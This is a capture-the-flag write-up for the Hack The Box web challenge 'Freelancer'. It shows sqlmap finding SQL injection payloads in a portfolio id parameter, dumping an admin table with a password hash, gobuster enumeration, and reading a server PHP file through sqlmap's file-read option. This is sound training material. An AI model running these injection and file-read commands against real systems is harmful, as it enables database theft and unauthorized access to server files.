---
title: Freelancer
date: 2020-07-21 14:50:00 +0100
categories: [Hack The Box, Challenges, Web]
tags: [web, SQLi, source]
---

# [Freelancer](https://app.hackthebox.eu/challenges/82)

First if you look at the source code, you will find interesting comments:

```HTML
<img class="img-fluid" src="img/portfolio/cake.png" alt="" />
<!-- <a href="portfolio.php?id=2">Portfolio 2</a> -->

```

Let's try sqlmap on that:

```bash
sqlmap  -u http://docker.hackthebox.eu:31458/portfolio.php?id=1 --tables
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.7#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:20:13 /2020-08-10/

[17:20:13] [INFO] resuming back-end DBMS 'mysql'
[17:20:13] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 6549=6549

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7332 FROM (SELECT(SLEEP(5)))lRuy)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7171717a71,0x5148554977577945784f7045465162456c506a4e7a64457a42767a44754f727768694346626e5971,0x71717a6271)-- -
---
[17:20:13] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[17:20:13] [INFO] fetching database names
[17:20:14] [INFO] fetching tables for databases: 'freelancer, information_schema, mysql, performance_schema'
Database: freelancer
[2 tables]
+----------------------------------------------------+
| portfolio                                          |
| safeadmin                                          |
+----------------------------------------------------+

```

Now let's dump `safeadmin`:

```bash
sqlmap  -u http://docker.hackthebox.eu:31458/portfolio.php?id=1 -T safeadmin --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.7#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:21:04 /2020-08-10/

[17:21:04] [INFO] resuming back-end DBMS 'mysql'
[17:21:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 6549=6549

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7332 FROM (SELECT(SLEEP(5)))lRuy)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7171717a71,0x5148554977577945784f7045465162456c506a4e7a64457a42767a44754f727768694346626e5971,0x71717a6271)-- -
---
[17:21:04] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[17:21:04] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[17:21:04] [INFO] fetching current database
[17:21:04] [INFO] fetching columns for table 'safeadmin' in database 'freelancer'
[17:21:04] [INFO] fetching entries for table 'safeadmin' in database 'freelancer'
Database: freelancer
Table: safeadmin
[1 entry]
+------+----------+--------------------------------------------------------------+---------------------+
| id   | username | password                                                     | created_at          |
+------+----------+--------------------------------------------------------------+---------------------+
| 1    | safeadm  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | 2019-07-16 20:25:45 |
+------+----------+--------------------------------------------------------------+---------------------+

[17:21:04] [INFO] table 'freelancer.safeadmin' dumped to CSV file '/home/fukurou/.sqlmap/output/docker.hackthebox.eu/dump/freelancer/safeadmin.csv'
[17:21:04] [INFO] fetched data logged to text files under '/home/fukurou/.sqlmap/output/docker.hackthebox.eu'

[*] ending @ 17:21:04 /2020-08-10/
```

you can try to break the hash but it ended up being impossible so I gave up.

I went back to the start and decided to run a little more enumeration on the website with `gobuster`:

```bash
gobuster dir -u http://docker.hackthebox.eu:31458/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://docker.hackthebox.eu:31458/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 17:23:00 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrat (Status: 301)
/css (Status: 301)
/favicon.ico (Status: 200)
/img (Status: 301)
/js (Status: 301)
/mail (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
/vendor (Status: 301)
===============================================================
2020/08/10 17:24:02 Finished
===============================================================

```

If you go to `/administrat` you will get to a login page. No luck trying to login but my guess is the flag was near. So time for some more enumeration:

```bash
gobuster dir -u http://docker.hackthebox.eu:31458/administrat -w /usr/share/wordlists/dirb/big.txt -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://docker.hackthebox.eu:31458/administrat
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/08/10 17:26:07 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/include (Status: 301)
/index.php (Status: 200)
/logout.php (Status: 302)
/panel.php (Status: 302)
===============================================================
2020/08/10 17:28:05 Finished
===============================================================

```

Now let's see the different files that are there `panel.php`, `logout.php` adn `index.php`. Since we want to read these files we also need to know the file structure. Usually this is close to something like `/var/www/html` so I tried with sqlmap:

```bash
sqlmap -u http://docker.hackthebox.eu:31458/portfolio.php?id=3 --file-read=/var/www/html/administrat/panel.php

```

Now let's get the file that we got in `.sqlmap/output/docker.hackthebox.eu` we should see a `output` directory and the file is in there and the flag is in plain in the HTML